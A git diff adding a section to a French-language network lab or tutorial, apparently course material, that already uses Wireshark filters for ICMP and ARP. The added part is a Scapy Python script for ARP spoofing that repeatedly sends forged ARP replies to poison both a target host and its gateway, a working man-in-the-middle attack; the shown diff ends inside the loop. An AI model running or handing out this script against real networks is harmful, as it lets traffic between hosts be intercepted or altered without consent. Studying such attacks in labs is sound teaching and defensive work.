@@ -255,3 +255,35 @@ Utilisez Wireshark pour capturer les paquets et sauvegardez la capture sous `arp
 
 ```plaintext
 icmp || arp
+
+
+``````
+
+
+# Scapy 
+
+# Script Python Simplifié : ARP Spoofing
+
+
+---
+
+## **Script Python**
+
+```python
+from scapy.all import ARP, send
+import time
+
+
+target_ip = "10.2.1.3"      
+gateway_ip = "10.2.1.254"    
+
+
+def arp_spoof():
+    print(f"[+] Lancement de l'ARP spoofing : {target_ip} ↔ {gateway_ip}")
+    try:
+        while True:
+            
+            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=False)
+           
+            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=False)
+            time.sleep(1) 
